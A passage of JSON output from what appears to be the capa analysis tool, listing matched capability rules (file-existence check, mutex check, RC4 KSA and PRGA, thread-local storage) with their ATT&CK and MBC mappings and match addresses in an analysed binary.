                                    "feature": {
                                      "type": "number",
                                      "number": 4294967295,
                                      "description": "INVALID_FILE_ATTRIBUTES"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791842
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791842
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "GetFileAttributes"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791734
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "instruction"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "cmp"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791740
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 4294967295,
                                      "description": "INVALID_FILE_ATTRIBUTES"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791740
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791740
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "GetFileAttributes"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791864
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "instruction"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "cmp"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791870
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 4294967295,
                                      "description": "INVALID_FILE_ATTRIBUTES"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791870
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791870
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791472
                    },
                    {
                      "type": "absolute",
                      "value": 1651791754
                    },
                    {
                      "type": "absolute",
                      "value": 1651791731
                    },
                    {
                      "type": "absolute",
                      "value": 1651791861
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "check if file exists/629d67a62c5a407ba486c28e0303ebb8"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "PathFileExists"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::Exists"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.FileSystemInfo::Exists"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "check mutex on Windows": {
        "meta": {
          "name": "check mutex on Windows",
          "namespace": "host-interaction/mutex",
          "authors": [
            "moritz.raabe@mandiant.com",
            "mehunhoff@google.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Check Mutex"
              ],
              "objective": "Process",
              "behavior": "Check Mutex",
              "method": "",
              "id": "C0043"
            }
          ],
          "references": [],
          "examples": [
            "1d8fd13c890060464019c0f07b928b1a:0x402eb0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: check mutex on Windows\r\n    namespace: host-interaction/mutex\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - mehunhoff@google.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Process::Check Mutex [C0043]\r\n    examples:\r\n      - 1d8fd13c890060464019c0f07b928b1a:0x402eb0\r\n  features:\r\n    - or:\r\n      - api: ntdll.NtQueryMutant\r\n      - and:\r\n        - match: create or open mutex on Windows\r\n        - or:\r\n          - api: WaitForSingleObject\r\n          - basic block:\r\n            - and:\r\n              - api: GetLastError\r\n              - or:\r\n                - number: 2 = ERROR_FILE_NOT_FOUND\r\n                - number: 0xB7 = ERROR_ALREADY_EXISTS\r\n                - number: 5 = ERROR_ACCESS_DENIED\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651792576
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "create or open mutex on Windows"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "OpenMutex"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "CreateMutex"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651792633
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "CreateMutexEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateMutant"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenMutant"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "format",
                                      "format": "dotnet"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "System.Threading.Mutex::ctor"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "System.Threading.Mutex::OpenExisting"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "System.Threading.Mutex::TryOpenExisting"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651792633
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "api",
                                      "api": "GetLastError"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651792647
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "number",
                                          "number": 2,
                                          "description": "ERROR_FILE_NOT_FOUND"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "number",
                                          "number": 183,
                                          "description": "ERROR_ALREADY_EXISTS"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 1651792653
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "number",
                                          "number": 5,
                                          "description": "ERROR_ACCESS_DENIED"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651792647
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "encrypt data using RC4 KSA": {
        "meta": {
          "name": "encrypt data using RC4 KSA",
          "namespace": "data-manipulation/encryption/rc4",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Cryptography",
                "Encrypt Data",
                "RC4"
              ],
              "objective": "Cryptography",
              "behavior": "Encrypt Data",
              "method": "RC4",
              "id": "C0027.009"
            },
            {
              "parts": [
                "Cryptography",
                "Encryption Key",
                "RC4 KSA"
              ],
              "objective": "Cryptography",
              "behavior": "Encryption Key",
              "method": "RC4 KSA",
              "id": "C0028.002"
            }
          ],
          "references": [],
          "examples": [
            "34404A3FB9804977C6AB86CB991FB130:0x403D40",
            "9324D1A8AE37A36AE560C37448C9705A:0x404950",
            "2B8BEC5BCB1777EAA155D832F7AFC797:0x405C42",
            "73CE04892E5F39EC82B00C02FC04C70F:0x40646E"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: encrypt data using RC4 KSA\r\n    namespace: data-manipulation/encryption/rc4\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic, mnemonic, Not features\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Cryptography::Encrypt Data::RC4 [C0027.009]\r\n      - Cryptography::Encryption Key::RC4 KSA [C0028.002]\r\n    examples:\r\n      - 34404A3FB9804977C6AB86CB991FB130:0x403D40\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x404950\r\n      - 2B8BEC5BCB1777EAA155D832F7AFC797:0x405C42\r\n      - 73CE04892E5F39EC82B00C02FC04C70F:0x40646E\r\n  features:\r\n    - or:\r\n      - and:\r\n        - basic block:\r\n          - and:\r\n            - description: initialize S\r\n            # misses if regular loop is used,\r\n            # however we cannot model that a loop contains a certain number\r\n            - characteristic: tight loop\r\n            - or:\r\n              - number: 0xFF\r\n              - number: 0x100\r\n        - or:\r\n          - description: modulo 256\r\n          - match: calculate modulo 256 via x86 assembly\r\n          - basic block:\r\n            - and:\r\n              - description: modulo via zero-extended mov from 8-bit register\r\n              - count(mnemonic(movzx)): 2 or more\r\n              # avoid false positives; filter out unexpected instructions\r\n              - not:\r\n                - or:\r\n                  - mnemonic: shl\r\n                  - mnemonic: rol\r\n                  - characteristic: nzxor\r\n        - or:\r\n          - description: modulo key length\r\n          - mnemonic: div\r\n          - mnemonic: idiv\r\n      - and:\r\n        - description: write DWORDs instead of bytes\r\n        - or:\r\n          - number: 0x03020100\r\n          - number: 0xFFFEFDFC\r\n        - instruction:\r\n          - or:\r\n            - mnemonic: add\r\n            - mnemonic: sub\r\n          - number: 0x04040404\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651793904
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and",
                      "description": "write DWORDs instead of bytes"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 50462976
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 4294901244
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "encrypt data using RC4 KSA/21b40aa2d7be4eb0a969df21e812981c"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "subscope",
                          "scope": "basic block"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "initialize S"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "tight loop"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651793920
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 255
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 256
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651793928
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "initialize S"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "tight loop"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651793952
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 255
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 256
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651794001
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651793920
                        },
                        {
                          "type": "absolute",
                          "value": 1651793952
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or",
                          "description": "modulo 256"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "calculate modulo 256 via x86 assembly"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and",
                                  "description": "modulo via zero-extended mov from 8-bit register"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "range",
                                      "min": 2,
                                      "max": 9223372036854775808,
                                      "child": {
                                        "type": "mnemonic",
                                        "mnemonic": "movzx"
                                      }
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651793952
                                    },
                                    {
                                      "type": "absolute",
                                      "value": 1651793978
                                    },
                                    {
                                      "type": "absolute",
                                      "value": 1651793982
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "not"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "shl"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "rol"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "characteristic",
                                              "characteristic": "nzxor"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651793952
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or",
                          "description": "modulo key length"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "mnemonic",
                              "mnemonic": "div"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651793966
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "mnemonic",
                              "mnemonic": "idiv"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "encrypt data using RC4 PRGA": {
        "meta": {
          "name": "encrypt data using RC4 PRGA",
          "namespace": "data-manipulation/encryption/rc4",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Cryptography",
                "Encrypt Data",
                "RC4"
              ],
              "objective": "Cryptography",
              "behavior": "Encrypt Data",
              "method": "RC4",
              "id": "C0027.009"
            },
            {
              "parts": [
                "Cryptography",
                "Generate Pseudo-random Sequence",
                "RC4 PRGA"
              ],
              "objective": "Cryptography",
              "behavior": "Generate Pseudo-random Sequence",
              "method": "RC4 PRGA",
              "id": "C0021.004"
            }
          ],
          "references": [],
          "examples": [
            "34404A3FB9804977C6AB86CB991FB130:0x403DB0",
            "34404A3FB9804977C6AB86CB991FB130:0x403E50",
            "9324D1A8AE37A36AE560C37448C9705A:0x4049F0",
            "73CE04892E5F39EC82B00C02FC04C70F:0x4064C6"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: encrypt data using RC4 PRGA\r\n    namespace: data-manipulation/encryption/rc4\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic, mnemonic, basicblock features\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Cryptography::Encrypt Data::RC4 [C0027.009]\r\n      - Cryptography::Generate Pseudo-random Sequence::RC4 PRGA [C0021.004]\r\n    examples:\r\n      - 34404A3FB9804977C6AB86CB991FB130:0x403DB0\r\n      - 34404A3FB9804977C6AB86CB991FB130:0x403E50\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4049F0\r\n      - 73CE04892E5F39EC82B00C02FC04C70F:0x4064C6\r\n  features:\r\n    - and:\r\n      # TODO: maybe add characteristic for nzxor reg size\r\n      - count(characteristic(nzxor)): 1\r\n      - or:\r\n        - match: calculate modulo 256 via x86 assembly\r\n        # compiler may do this via zero-extended mov from 8-bit register\r\n        - count(mnemonic(movzx)): 4 or more\r\n      # should not call (many) functions\r\n      - count(characteristic(calls from)): (0, 4)\r\n      # should not be too simple or too complex (50 is picked by intuition)\r\n      - count(basic blocks): (4, 50)\r\n      - match: contain loop\r\n      - optional:\r\n        - or:\r\n          - number: 0xFF\r\n          - number: 0x100\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651794016
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "contain loop"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "characteristic",
                              "characteristic": "loop"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "characteristic",
                              "characteristic": "tight loop"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651794032
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "characteristic",
                              "characteristic": "recursive call"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651794016
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 1,
                      "max": 1,
                      "child": {
                        "type": "characteristic",
                        "characteristic": "nzxor"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651794095
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 0,
                      "max": 4,
                      "child": {
                        "type": "characteristic",
                        "characteristic": "calls from"
                      }
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 4,
                      "max": 50,
                      "child": {
                        "type": "basic block"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651794016
                    },
                    {
                      "type": "absolute",
                      "value": 1651794111
                    },
                    {
                      "type": "absolute",
                      "value": 1651794032
                    },
                    {
                      "type": "absolute",
                      "value": 1651794023
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "calculate modulo 256 via x86 assembly"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "range",
                          "min": 4,
                          "max": 9223372036854775808,
                          "child": {
                            "type": "mnemonic",
                            "mnemonic": "movzx"
                          }
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651794032
                        },
                        {
                          "type": "absolute",
                          "value": 1651794064
                        },
                        {
                          "type": "absolute",
                          "value": 1651794085
                        },
                        {
                          "type": "absolute",
                          "value": 1651794040
                        },
                        {
                          "type": "absolute",
                          "value": 1651794089
                        },
                        {
                          "type": "absolute",
                          "value": 1651794043
                        },
                        {
                          "type": "absolute",
                          "value": 1651794060
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 255
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 256
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get thread local storage value": {
        "meta": {
          "name": "get thread local storage value",
          "namespace": "host-interaction/process",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get thread local storage value\r\n    namespace: host-interaction/process\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n  features:\r\n    - and:\r\n      - api: kernel32.TlsGetValue\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651806592
            },
